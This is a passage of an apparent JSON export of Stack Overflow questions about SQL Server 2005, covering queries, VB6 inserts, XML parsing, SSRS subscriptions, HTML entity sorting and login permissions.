following:</p>\n\n<pre><code>ER\n\nER,ER,ER\n\nER,ER,OR,OR\n\nOR\n\nOR,OR\n\nOR,OR,OR,ER,ER\n</code></pre>\n\n<p>I am looking for a way to replace any a string such as <code>\"ER,ER,ER,OR,OR\"</code> to just <code>\"ER,OR\"</code>.  No matter how many times <code>ER</code> or <code>OR</code> show up I just want each displayed only once.  Thank you</p>\n"},{"tags":["sql-server-2005","vb6"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":561,"score":0,"question_id":11965241,"title":"Implicit conversion from data type varchar to varbinary(max) is not allowed. Use the CONVERT function to run this query","body":"<p>This is the code within my SAVE button in the form. I'm using VB6.0 and MSSQL Server 2005.  </p>\n\n<p>CommonDialog1 &amp; 2 holds the filename of the image inserted in the picture box.  </p>\n\n<pre class=\"lang-vb prettyprint-override\"><code>Set rs = con.Execute(\"insert into table1   \nvalues('\" &amp; txtbox1.Text &amp; \"' , \"_  \n&amp; \" '\" &amp; txtbox2.Text &amp; \"' , \"_     \n&amp; \" '\" &amp; CommonDialog1.FileName &amp; \"' , \"_    \n&amp; \" '\" &amp; CommonDialog2.FileName &amp; \"' , \"_  \n&amp; \" '\" &amp; txtbox3.Text &amp; \"' )\")\n</code></pre>\n\n<p>The <strong>\"Implicit conversion from data type varchar to varbinary(max) is not allowed. Use the CONVERT function to run this query.\"</strong> - error pops up during run-time.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":11956828,"title":"SQL Server union functionality?","body":"<p>I have a question regarding my attempt to combine two tables in sql server...</p>\n\n<p>I have one table that has about 30 columns (table a), and a second table that has about 5 (table b), those 5 being present in the 30 column table. I want to be able to add table b to the end of table a, and just use 0 values for the nonexistent columns in the new rows. </p>\n\n<p>Is there a way to do this? Obviously a regular union wouldnt work if I want to keep the other columns in table a.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":209,"score":1,"question_id":3148078,"title":"What is the SQL query to return the SQL error log configuration?","body":"<p>What is the SQL query to return the SQL error log configuration?</p>\n"},{"tags":["sql-server-2005","ssrs-2008","reportingservices-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":11971717,"title":"How can I list SSRS subscriptions that are invoked when an SSRS Snapshot completes?","body":"<p>I have searched various web sites and found an example on www.mssqltips.com that lists all subscriptions that have a shared schedule (tip prvided by  Scott Murray. It works well with SQL Server 2005 up to 2008 R2).</p>\n\n<p>We have a large number of subscriptions that are not fired via their own schedule, but when an SSRS snapshot job completes. The SSRS snapshot jobs are fired via their own SQL server Agent schedule, or manually.</p>\n\n<p>How can we identify the subscriptions that are trigerred in this way?</p>\n"},{"tags":["asp.net","sql","query","sql-server-2005"],"answer_count":4,"favorite_count":1,"up_vote_count":7,"down_vote_count":1,"view_count":169,"score":6,"question_id":11957445,"title":"Advice on SQL-Server Query","body":"<p>I'm looking to improve this query I wrote for a small web application in ASP.NET 4.0 using SQL-Server 2005. This application will allow the user to search by Product ID and have it return the following information:</p>\n\n<ul>\n<li>Highest Purchase Price + Most Recent Date of purchase @ this price</li>\n<li>Lowest Purchase Price + Most Recent Date of purchase @ this price</li>\n<li>Most Recent Purchase Price + Date</li>\n<li>Average Purchase Price (optional, i thought this might improve the usefulness of the app)</li>\n</ul>\n\n<p>Here is the structure of the Products table (I'm only including relevant columns, this is a DB already in production and these are non-pk columns)</p>\n\n<ul>\n<li>product_id (nvarchar(20))</li>\n<li>price (decimal(19,2))</li>\n<li>pDate (datetime)</li>\n</ul>\n\n<p>Before I put down the query I have so far I just want to say that I can get this information easily through multiple queries, so if this is the best practice then disregard improving the query, but I was aiming to minimize the number of queries needed to get all needed information.</p>\n\n<p>What I have so far: (Note: There are rows with price = 0 so I ignored those in the bottom select looking for the MIN price)</p>\n\n<pre><code>SELECT price, MAX(pDate)\nFROM Products\nWHERE product_id = @product_id AND\n     (price = (SELECT MAX(price)\n               FROM Products\n               WHERE product_id =@product_id) OR\n      price = (SELECT MIN(price)\n               FROM Products\n               WHERE product_id = @product_id AND price &gt; 0))\nGROUP BY price\n</code></pre>\n\n<p>Now this is returning 2 rows:</p>\n\n<ul>\n<li>first = the lowest price + date</li>\n<li>second row = high price + date</li>\n</ul>\n\n<p>What I would like ideally is to have a query return 1 row with all the needed information stated above if possible, as it would simplify displaying the information in ASP for me. And like I said earlier, if multiple queries is the be approach then no need to re-write a complex query here.</p>\n\n<p><em>Edit</em></p>\n\n<p>Here is some sample data</p>\n\n<p><img src=\"http://i.stack.imgur.com/9bFU8.png\" alt=\"Sample Data\"></p>\n\n<p>Desired query results: (ignore the format as I typed this in excel)</p>\n\n<p><img src=\"http://i.stack.imgur.com/z4seg.png\" alt=\"enter image description here\"></p>\n\n<p>Here is the query I will be using thanks to Ken Benson:</p>\n\n<pre><code>SELECT TOP 1 prod.product_id,\n   minp.price AS minprice, minp.pDate as minlastdate,\n   maxp.price AS maxprice, maxp.pDate as maxlastdate,\n   ag.price AS averageprice\nFROM products AS prod\nLEFT JOIN (SELECT lmd.product_id,max(lmd.pDate) as pDate,mn.price FROM products as lmd INNER JOIN \n           (SELECT product_id, min(price) AS price from products WHERE price &gt; 0 group by product_id) as mn ON lmd.product_id=mn.product_id AND lmd.price=mn.price\n                  group by lmd.product_id,mn.price ) AS minp ON minp.product_id=prod.product_id\nLEFT JOIN (SELECT lxd.product_id,max(lxd.pDate) as pDate,mx.price FROM products as lxd INNER JOIN \n           (SELECT product_id, max(price) AS price from products group by product_id) as mx ON lxd.product_id=mx.product_id AND lxd.price=mx.price\n              group by lxd.product_id,mx.price ) AS maxp ON maxp.product_id=prod.product_id\nLEFT JOIN (SELECT product_id,avg(price) as price FROM products WHERE price &gt; 0 GROUP BY product_id) AS ag ON ag.product_id=prod.product_id\nWHERE prod.product_id=@product_id\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":11965847,"title":"Crosstab/cross over query","body":"<p>Given data looks like</p>\n\n<pre><code>PLI_ID   OWN_ID   DCSF_ID   SCH_NAME          PREMIUM1 PREMIUM2  DESCRIPTION  \n901      2        1000     Dfe-School 1        86.40     7.20    Heads, Deps\n902      2        1000     Dfe-School 2        403.30    8.40    Relief Bursar\n903      2        1000     Dfe-School 3        327.00    8.40    10.00 \n904      2        1000     Dfe-School 4        381.50    8.40    11.00 \n905      2        1000     Dfe-School 5        152.60    8.40    Teaching staff\n</code></pre>\n\n<p>Expected data to look like</p>\n\n<pre><code>School          10.00  11.00  Heads, Deps  Relief Bursar  Teaching staff  Total\nDfe-School 1                            \nDfe-School 2                            \nDfe-School 3                            \nDfe-School 4                            \n\nTotal                                                                  [Pre-Total]\n</code></pre>\n\n<p>I am not sure whether to write a Cross Tab or Cross Over query, as suggested. Let me know, if need more explanation.</p>\n\n<p>My query uses around 6 tables and it looks like this: </p>\n\n<pre>\nSELECT PolicyLine.PLI_POS_Id, Policy.POL_OWN_Id, Policy.POL_DCSF, School.SCH_Name, PolicyLine.PLI_Premium, CoverPremium.CPR_Premium, StaffCategory.SCA_Description FROM\nSchool \nINNER JOIN Policy ON School.SCH_OWN_Id = Policy.POL_OWN_Id AND School.SCH_DCSF = Policy.POL_DCSF \nINNER JOIN PolicyLine ON Policy.POL_Id = PolicyLine.PLI_POL_Id \nINNER JOIN CoverOption ON PolicyLine.PLI_COP_Id = CoverOption.COP_Id \nINNER JOIN  CoverPremium ON CoverOption.COP_Id = CoverPremium.CPR_COP_Id AND Policy.POL_OWN_Id = CoverPremium.CPR_OWN_Id \nRIGHT OUTER JOIN StaffCategory ON CoverOption.COP_SCA_Id = StaffCategory.SCA_\n</pre>\n"},{"tags":["sql-server","sql-server-2005","security","sql-server-2008"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":2654,"score":1,"question_id":4081651,"title":"How to decode password from sys.syslogins table","body":"<p>I have a program in which the user needs to login with user name and password.\nI'm checking the name from the <code>sys.syslogins</code> table in master db.\nBut for the password I receive a string with (probably) coded characters like this (1?????????????).\nNow what can I do in order to decode that string and take the password in order to compare with the enter it one?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":5,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":3751,"score":6,"question_id":865162,"title":"Change Owner of Database Diagram in SQL Server 2005","body":"<p>I need to change the owner of a database diagram in SQL Server 2005. Currently it is owned by me (domain\\username.diagramName) and I would like to change it to be owned by dbo (dbo.diagramName). I thought I could use sp_changeobjectowner, but I believe that is only for tables, stored procedures, etc... I think this is pretty easy, I just haven't been able to find anything through a google search.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":11961398,"title":"How to ignore index in SQL Server","body":"<p>I found that one of the indexes is slowing my Query...but I can't drop it because it is used else where and it seems it is a good index for that query.</p>\n\n<p>Is there a way in SQL Server 2005+, where I could ignore an index in a Query?</p>\n"},{"tags":["sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":11956815,"title":"Extracting Elements using XQuery/SQL Server","body":"<p>I'm having zero success parsing the PartnerDescription elements from the /ShippingDocumentationNotification/ShippingBusinessDocument/ShipmentInformation/DeclarationInformation node in the XML extract below. My latest attempt:</p>\n\n<pre><code>SELECT  x.item.value('PartnerName[1]', 'VARCHAR(20)') AS PartnerName\nFROM    @Data.nodes('/ShippingDocumentationNotification/ShippingBusinessDocument/ShipmentInformation/DeclarationInformation/PartnerDescription/FullPartner/PartnerIdentification/PartnerName')\n        AS x ( item )\n</code></pre>\n\n<p>Where @Data is an XML variable that stores an instance of the XML extract. Ultimately I'd like to parse (i.e., flatten) data contained in the PartnerIdentification and PhysicalAddress subnodes of each PartnerDescription node.  I've looked all over google and SO - if someone could just get me started, I'd be much obliged.</p>\n\n<pre><code>&lt;tns:ShippingDocumentationNotification \n    xmlns:sha=\"urn:rosettanet:specification:domain:Shared:xsd:schema:01.17\" xmlns:dfpt=\"urn:rosettanet:specification:domain:Logistics:FreightPaymentTerms:xsd:codelist:01.03\" xmlns:uc=\"urn:rosettanet:specification:universal:Country:xsd:codelist:01.02\" xmlns:drl=\"urn:rosettanet:specification:domain:Logistics:RouteLocation:xsd:codelist:01.03\" xmlns:tns=\"urn:rosettanet:specification:interchange:ShippingDocumentationNotification:xsd:schema:02.07\" xmlns:dcst=\"urn:rosettanet:specification:domain:Logistics:CustomsType:xsd:codelist:01.03\" xmlns:dtrt=\"urn:rosettanet:specification:domain:Logistics:TrackingReferenceType:xsd:codelist:01.06\" xmlns:ssdh=\"urn:rosettanet:specification:system:StandardDocumentHeader:xsd:schema:01.23\" xmlns:uci=\"urn:rosettanet:specification:universal:ContactInformation:xsd:schema:01.04\" xmlns:updi=\"urn:rosettanet:specification:universal:ProductIdentification:xsd:schema:01.04\" xmlns:upi=\"urn:rosettanet:specification:universal:PartnerIdentification:xsd:schema:01.16\" xmlns:ucs=\"urn:rosettanet:specification:universal:CountrySubdivision:xsd:codelist:01.02\" xmlns:uuom=\"urn:rosettanet:specification:universal:UnitOfMeasure:xsd:codelist:01.04\" xmlns:ulc=\"urn:rosettanet:specification:universal:Locations:xsd:schema:01.04\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:upri=\"urn:rosettanet:specification:universal:ProcessRoleIdentifier:xsd:codelist:01.11\" xmlns:dsd=\"urn:rosettanet:specification:domain:Logistics:ShippingDocument:xsd:codelist:01.02\" xmlns:udct=\"urn:rosettanet:specification:universal:DocumentType:xsd:codelist:01.13\" xmlns:upd=\"urn:rosettanet:specification:universal:PhysicalDimension:xsd:schema:01.07\" xmlns:pfx24=\"http://www.tibco.com/xmlns/ae2xsd/2002/05/ae/ADB/OTMflex\" xmlns:udc=\"urn:rosettanet:specification:universal:Document:xsd:schema:01.12\" xmlns:rat=\"urn:rosettanet:specification:domain:Shared:AmountType:xsd:codelist:01.03\" xmlns:dat=\"urn:rosettanet:specification:domain:Procurement:ActionType:xsd:codelist:01.04\" xmlns=\"http://xyz/\" xmlns:dl=\"urn:rosettanet:specification:domain:Logistics:xsd:schema:02.22\" xmlns:dic=\"urn:rosettanet:specification:domain:Logistics:Incoterms:xsd:codelist:01.03\" xmlns:dsm=\"urn:rosettanet:specification:domain:Logistics:ShipmentMode:xsd:codelist:01.05\" xmlns:ume=\"urn:rosettanet:specification:universal:MonetaryExpression:xsd:schema:01.06\" xmlns:dpts=\"urn:rosettanet:specification:domain:Procurement:PaymentTerms:xsd:codelist:01.04\" xmlns:rssl=\"urn:rosettanet:specification:domain:Shared:ShippingServiceLevel:xsd:codelist:01.01\" xmlns:ucr=\"urn:rosettanet:specification:universal:Currency:xsd:codelist:01.03\" xmlns:dp=\"urn:rosettanet:specification:domain:Procurement:xsd:schema:02.28\" xmlns:dsh=\"urn:rosettanet:specification:domain:Procurement:SpecialHandling:xsd:codelist:01.04\"&gt;\n      &lt;ssdh:DocumentHeader&gt;\n        &lt;ssdh:DocumentInformation&gt;\n          &lt;ssdh:Creation&gt;2012-05-08T05:12:57-07:00&lt;/ssdh:Creation&gt;\n          &lt;ssdh:DocumentIdentification&gt;\n            &lt;ssdh:Identifier&gt;25163&lt;/ssdh:Identifier&gt;\n            &lt;ssdh:Type&gt;TRUCK CLOSE&lt;/ssdh:Type&gt;\n            &lt;ssdh:StandardDocumentIdentification&gt;\n              &lt;ssdh:Standard&gt;RosettaNet&lt;/ssdh:Standard&gt;\n              &lt;ssdh:Version&gt;11.11&lt;/ssdh:Version&gt;\n            &lt;/ssdh:StandardDocumentIdentification&gt;\n          &lt;/ssdh:DocumentIdentification&gt;\n        &lt;/ssdh:DocumentInformation&gt;\n        &lt;ssdh:Receiver&gt;\n          &lt;upi:PartnerIdentification&gt;\n            &lt;upi:PartnerName /&gt;\n            &lt;DUNS xmlns=\"urn:rosettanet:specification:universal:DataType:xsd:schema:01.04\"&gt;894694306&lt;/DUNS&gt;\n          &lt;/upi:PartnerIdentification&gt;\n        &lt;/ssdh:Receiver&gt;\n        &lt;ssdh:Sender&gt;\n          &lt;upi:PartnerIdentification&gt;\n            &lt;upi:PartnerName&gt;CISCO&lt;/upi:PartnerName&gt;\n            &lt;DUNS xmlns=\"urn:rosettanet:specification:universal:DataType:xsd:schema:01.04\"&gt;678543210&lt;/DUNS&gt;\n          &lt;/upi:PartnerIdentification&gt;\n        &lt;/ssdh:Sender&gt;\n      &lt;/ssdh:DocumentHeader&gt;\n      &lt;tns:ShippingBusinessDocument&gt;\n        &lt;dat:ActionType&gt;ADD&lt;/dat:ActionType&gt;\n        &lt;tns:HeaderInformation&gt;\n          &lt;tns:PackingList&gt;\n            &lt;udc:DateTime&gt;2012-03-01T00:39:54-07:00&lt;/udc:DateTime&gt;\n            &lt;udct:DocumentType&gt;SHD&lt;/udct:DocumentType&gt;\n            &lt;udc:Identifier&gt;0&lt;/udc:Identifier&gt;\n            &lt;udc:Line&gt;0&lt;/udc:Line&gt;\n            &lt;udc:Revision&gt;F&lt;/udc:Revision&gt;\n          &lt;/tns:PackingList&gt;\n          &lt;tns:ShippingDocument&gt;\n            &lt;udc:DateTime&gt;2012-03-01T00:39:54-07:00&lt;/udc:DateTime&gt;\n            &lt;udct:DocumentType&gt;SAO&lt;/udct:DocumentType&gt;\n            &lt;udc:Identifier&gt;51548069&lt;/udc:Identifier&gt;\n            &lt;udc:Line&gt;1&lt;/udc:Line&gt;\n            &lt;udc:Revision&gt;Standard - JPN&lt;/udc:Revision&gt;\n          &lt;/tns:ShippingDocument&gt;\n          &lt;tns:ShippingOrderInformation&gt;\n            &lt;dl:OrderInformation&gt;\n              &lt;ulc:AlternativeIdentifier&gt;\n                &lt;ulc:Authority&gt;Cisco Systems&lt;/ulc:Authority&gt;\n                &lt;ulc:Identifier /&gt;\n              &lt;/ulc:AlternativeIdentifier&gt;\n              &lt;dl:OrderAllocationDate&gt;2012-03-16T00:00:00-07:00&lt;/dl:OrderAllocationDate&gt;\n              &lt;dl:OrderReference&gt;\n                &lt;udc:DateTime&gt;2012-05-08T05:12:57-07:00&lt;/udc:DateTime&gt;\n                &lt;udct:DocumentType&gt;PUO&lt;/udct:DocumentType&gt;\n                &lt;udc:Identifier&gt;X9055411-K2501&lt;/udc:Identifier&gt;\n              &lt;/dl:OrderReference&gt;\n              &lt;dl:TotalAmount&gt;\n                &lt;ume:Amount&gt;6422.09&lt;/ume:Amount&gt;\n                &lt;ucr:Currency&gt;USD&lt;/ucr:Currency&gt;\n              &lt;/dl:TotalAmount&gt;\n            &lt;/dl:OrderInformation&gt;\n            &lt;tns:RequestingOrderInformation&gt;\n              &lt;udc:BusinessDocumentReference&gt;\n                &lt;udct:DocumentType&gt;SAO&lt;/udct:DocumentType&gt;\n                &lt;udc:Identifier&gt;51548069-1&lt;/udc:Identifier&gt;\n              &lt;/udc:BusinessDocumentReference&gt;\n              &lt;tns:IsOrderToBeMerged&gt;0&lt;/tns:IsOrderToBeMerged&gt;\n              &lt;tns:OrderReference&gt;\n                &lt;udc:DateTime&gt;2012-05-08T05:12:57-07:00&lt;/udc:DateTime&gt;\n                &lt;udct:DocumentType&gt;SNC&lt;/udct:DocumentType&gt;\n                &lt;udc:Identifier&gt;0&lt;/udc:Identifier&gt;\n                &lt;udc:Line&gt;1&lt;/udc:Line&gt;\n                &lt;udc:Revision&gt;1&lt;/udc:Revision&gt;\n                &lt;udc:SubLine&gt;1&lt;/udc:SubLine&gt;\n              &lt;/tns:OrderReference&gt;\n            &lt;/tns:RequestingOrderInformation&gt;\n            &lt;tns:RequestingOrderInformation&gt;\n              &lt;udc:BusinessDocumentReference&gt;\n                &lt;udct:DocumentType&gt;SAO&lt;/udct:DocumentType&gt;\n                &lt;udc:Identifier&gt;51548069-1&lt;/udc:Identifier&gt;\n              &lt;/udc:BusinessDocumentReference&gt;\n              &lt;tns:IsOrderToBeMerged&gt;0&lt;/tns:IsOrderToBeMerged&gt;\n              &lt;tns:OrderReference&gt;\n                &lt;udc:DateTime&gt;2012-05-08T05:12:57-07:00&lt;/udc:DateTime&gt;\n                &lt;udct:DocumentType&gt;SNC&lt;/udct:DocumentType&gt;\n                &lt;udc:Identifier&gt;0&lt;/udc:Identifier&gt;\n                &lt;udc:Line&gt;1&lt;/udc:Line&gt;\n                &lt;udc:Revision&gt;1&lt;/udc:Revision&gt;\n                &lt;udc:SubLine&gt;2&lt;/udc:SubLine&gt;\n              &lt;/tns:OrderReference&gt;\n            &lt;/tns:RequestingOrderInformation&gt;\n          &lt;/tns:ShippingOrderInformation&gt;\n        &lt;/tns:HeaderInformation&gt;\n        &lt;tns:ShipmentInformation&gt;\n          &lt;tns:ContainerTotalCount&gt;1&lt;/tns:ContainerTotalCount&gt;\n          &lt;dl:CustomsInformation&gt;\n            &lt;dl:Customs&gt;\n              &lt;uc:Country&gt;US&lt;/uc:Country&gt;\n              &lt;dcst:CustomsType&gt;EXP&lt;/dcst:CustomsType&gt;\n              &lt;dl:EntryNumber&gt;77-0059951&lt;/dl:EntryNumber&gt;\n              &lt;dl:Identifier /&gt;\n            &lt;/dl:Customs&gt;\n          &lt;/dl:CustomsInformation&gt;\n          &lt;tns:DeclarationInformation&gt;\n            &lt;tns:Declarant&gt;\n              &lt;upi:SpecifiedFullPartner schemaVersion=\"this choice is requried\" /&gt;\n            &lt;/tns:Declarant&gt;\n            &lt;tns:IsInformationComplete&gt;1&lt;/tns:IsInformationComplete&gt;\n            &lt;upi:PartnerDescription&gt;\n              &lt;upi:FullPartner&gt;\n                &lt;uci:ContactInformation&gt;\n                  &lt;uci:Contact /&gt;\n                  &lt;uci:Phone /&gt;\n                &lt;/uci:ContactInformation&gt;\n                &lt;ulc:Location&gt;\n                  &lt;ulc:AlternativeIdentifier&gt;\n                    &lt;ulc:Authority&gt;Cisco Systems&lt;/ulc:Authority&gt;\n                    &lt;ulc:Identifier&gt;CCI+CI+PL+PL2+SLI&lt;/ulc:Identifier&gt;\n                  &lt;/ulc:AlternativeIdentifier&gt;\n                &lt;/ulc:Location&gt;\n                &lt;upi:PartnerIdentification&gt;\n                  &lt;upi:PartnerName&gt;CISCO SYSTEMS G.K.&lt;/upi:PartnerName&gt;\n                  &lt;ulc:AlternativeIdentifier&gt;\n                    &lt;ulc:Authority&gt;Cisco Systems&lt;/ulc:Authority&gt;\n                    &lt;ulc:Identifier&gt;68268&lt;/ulc:Identifier&gt;\n                  &lt;/ulc:AlternativeIdentifier&gt;\n                &lt;/upi:PartnerIdentification&gt;\n                &lt;ulc:PhysicalAddress&gt;\n                  &lt;ulc:AddressLine1&gt;Midtown Tower&lt;/ulc:AddressLine1&gt;\n                  &lt;ulc:AddressLine2&gt;9-7-1, Akasaka&lt;/ulc:AddressLine2&gt;\n                  &lt;ulc:AddressLine3&gt;Minato-ku&lt;/ulc:AddressLine3&gt;\n                  &lt;ulc:AddressLine4 /&gt;\n                  &lt;ulc:AddressLine5 /&gt;\n                  &lt;ulc:CityName&gt;Tokyo, 107-6227&lt;/ulc:CityName&gt;\n                  &lt;uc:Country&gt;JP&lt;/uc:Country&gt;\n                  &lt;ucs:CountrySubdivision /&gt;\n                  &lt;ulc:PostalCode /&gt;\n                  &lt;ulc:PostOfficeBox /&gt;\n                &lt;/ulc:PhysicalAddress&gt;\n                &lt;upri:ProcessRoleIdentifier&gt;IMB&lt;/upri:ProcessRoleIdentifier&gt;\n              &lt;/upi:FullPartner&gt;\n            &lt;/upi:PartnerDescription&gt;\n            &lt;upi:PartnerDescription&gt;\n              &lt;upi:FullPartner&gt;\n                &lt;uci:ContactInformation&gt;\n                  &lt;uci:Contact&gt;None&lt;/uci:Contact&gt;\n                  &lt;uci:Phone /&gt;\n                &lt;/uci:ContactInformation&gt;\n                &lt;ulc:Location&gt;\n                  &lt;ulc:AlternativeIdentifier&gt;\n                    &lt;ulc:Authority&gt;Cisco Systems&lt;/ulc:Authority&gt;\n                    &lt;ulc:Identifier&gt;CCI+CI+PL+PL2+SLI&lt;/ulc:Identifier&gt;\n                  &lt;/ulc:AlternativeIdentifier&gt;\n                &lt;/ulc:Location&gt;\n                &lt;upi:PartnerIdentification&gt;\n                  &lt;upi:PartnerName&gt;CISCO SYSTEMS G.K.&lt;/upi:PartnerName&gt;\n                  &lt;ulc:AlternativeIdentifier&gt;\n                    &lt;ulc:Authority&gt;Cisco Systems&lt;/ulc:Authority&gt;\n                    &lt;ulc:Identifier /&gt;\n                  &lt;/ulc:AlternativeIdentifier&gt;\n                &lt;/upi:PartnerIdentification&gt;\n                &lt;ulc:PhysicalAddress&gt;\n                  &lt;ulc:AddressLine1&gt;C/o Schenker Logistics&lt;/ulc:AddressLine1&gt;\n                  &lt;ulc:AddressLine2&gt;MIDTOWN TOWER&lt;/ulc:AddressLine2&gt;\n                  &lt;ulc:AddressLine3&gt;9-7-1, AKASAKA&lt;/ulc:AddressLine3&gt;\n                  &lt;ulc:AddressLine4 /&gt;\n                  &lt;ulc:AddressLine5 /&gt;\n                  &lt;ulc:CityName&gt;MINATO-KU&lt;/ulc:CityName&gt;\n                  &lt;uc:Country&gt;JP&lt;/uc:Country&gt;\n                  &lt;ucs:CountrySubdivision&gt;TOKYO&lt;/ucs:CountrySubdivision&gt;\n                  &lt;ulc:PostalCode&gt;107-6227&lt;/ulc:PostalCode&gt;\n                  &lt;ulc:PostOfficeBox /&gt;\n                &lt;/ulc:PhysicalAddress&gt;\n                &lt;upri:ProcessRoleIdentifier&gt;ITT&lt;/upri:ProcessRoleIdentifier&gt;\n              &lt;/upi:FullPartner&gt;\n            &lt;/upi:PartnerDescription&gt;\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","replace","html-entities"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":180,"score":0,"question_id":11959566,"title":"How can I convert all HTML Entities and unicode chars to english equivalents for sorting in SQL?","body":"<p>I have database data that has special characters in both unicode and html entity format in the data. I need to sort the list of results alphabetically however, some of the unicode data and html entities mess up the alphabetical order (ie: &amp;# comes before A when the code might be for an accented E which comes after A). </p>\n\n<p>Currently, I'm just using a nested replace statement to generate a 'sort' column since I was under the impression there was a limited set of special characters used in the DB. </p>\n\n<p>The client wants to be on the safe side and convert ALL characters on this page <a href=\"http://webdesign.about.com/library/bl_htmlcodes.htm\" rel=\"nofollow\">http://webdesign.about.com/library/bl_htmlcodes.htm</a> into english equivalents before sorting... </p>\n\n<p>Current code:</p>\n\n<pre><code>Replace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(@Word, '', 'A') \n             , '', 'A')\n             , '', 'A')\n             , '', 'C')\n             , '', 'E')\n             , '', 'E')\n             , '', 'E')\n             , '', 'E')\n             , '', 'I')\n             , '', 'i')\n             , '&amp;#216;', 'O')\n             , '&amp;#336;', 'o')\n             , '&amp;#193;', 'A')\n             , '&amp;#209;', 'N')\n             , '&amp;#237;', 'I')\n             , '&amp;#211;', 'O')\n             , '&amp;#323;', 'N')\n             , '&amp;#268;', 'C')\n             , '&amp;#225;', 'A')\n             , '&amp;#337;', 'O')\n             , '', 'o')\n             , '', 'o')\n</code></pre>\n\n<p>I realize this code is terribly inefficient - it started with only a couple of characters and then was added to over time. </p>\n\n<p>What would be the best way to cycle through all the combinations on the page linked above? </p>\n\n<p>Better yet, can someone confirm if the unicode values are sorted properly alphabetically and if so, is there a pre-built SQL Server 2005 function to just convert HTML Entities (friendly, numerical and hex versions) to Unicode for this column? </p>\n\n<p>Thanks,</p>\n\n<p>Thomas</p>\n"},{"tags":["sql","sql-server","string","sql-server-2005","split"],"answer_count":10,"favorite_count":21,"up_vote_count":84,"down_vote_count":0,"view_count":149648,"score":84,"question_id":2647,"title":"Split string in SQL","body":"<p>Using SQL Server 2005, how do I split a string so I can access item x?</p>\n\n<p>For example, take the string \"Hello John Smith\". How can I split the string by a space and access the item at index 1 which should return \"John\"?</p>\n"},{"tags":["c#","sql-server-2005","import-from-excel"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1026,"score":1,"question_id":11954296,"title":"Could not load file or assembly 'Microsoft.Office.Interop.Excel, Version=12.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c'","body":"<p>When I am adding foll. code but on server its showing error.\nCode - </p>\n\n<pre><code> object oMissing = System.Reflection.Missing.Value;\n                        Microsoft.Office.Interop.Excel.ApplicationClass xl = new Microsoft.Office.Interop.Excel.ApplicationClass();\n                        Microsoft.Office.Interop.Excel.Workbook xlBook;\n                        Microsoft.Office.Interop.Excel.Worksheet xlSheet;\n                        xlBook = (Workbook)xl.Workbooks.Open(docPath, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing);\n                        xlSheet = (Worksheet)xlBook.Worksheets.get_Item(1);\n                        xlSheet.Name = \"Sheet1\";\n                        xlBook.Save();\n                        xl.Application.Workbooks.Close();\n</code></pre>\n\n<p>Error - </p>\n\n<pre><code>System.IO.FileNotFoundException: Could not load file or assembly 'Microsoft.Office.Interop.Excel, Version=12.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c' or one of its dependencies. The system cannot find the file specified.\n</code></pre>\n\n<p>I have added reference of \"Microsoft.Office.Interop.Excel\" dll in webApplication.\nIn local its working fine. \nNote : In server microsoft Office is not installed.\nCan any one solve this issue without any installation on server.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":11515,"score":3,"question_id":803386,"title":"Easy way to import/export Sql Server 2005 users/permissions across instances?","body":"<p>Is there an easy way to export and then import users/permissions from one Sql Server 2005 instance to another?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":318,"score":1,"question_id":11951135,"title":"SQL Selecting distinct rows from multiple columns based on max value in one column","body":"<p>This is my SQL View - lets call it MyView :</p>\n\n<pre>\nECode   SHCode  TotalNrShare    CountryCode Country\n000001  +00010  100 UKI United Kingdom\n000001  ABENSO  900 USA United States\n000355  +00012  1000    ESP Spain\n000355  000010  50  FRA France\n000042  009999  10  GER Germany\n000042  +00012  999 ESP Spain\n000787  ABENSO  500 USA United States\n000787  000150  500 ITA Italy\n001010  009999  100 GER Germany\n</pre>\n\n<p>I would like to return the single row with the highest number in the column TotalNrShare for each ECode.</p>\n\n<p>For example, Id like to return these results from the above view:</p>\n\n<pre>\nECode   SHCode  TotalNrShare    CountryCode Country\n000001  ABENSO  900 USA United States\n000355  +00012  1000    ESP Spain\n000042  +00012  999 ESP Spain\n000787  ABENSO  500 USA United States\n001010  009999  100 GER Germany\n</pre>\n\n<p>(note in the case of ECode 000787 where there are two SHCode's with 500 each, as they are the same amount we can just return the first row rather than both, it isnt important for me which row is returned since this will happen very rarely and my analysis doesnt need to be 100%)</p>\n\n<p>Ive tried various things but do not seem to be able to return either unqiue results or the additional country code/country info that I need.</p>\n\n<p>This is one of my attempts (based on other solutions on this site, but I am doing something wrong):</p>\n\n<pre><code>SELECT tsh.ECode, tsh.SHCode, 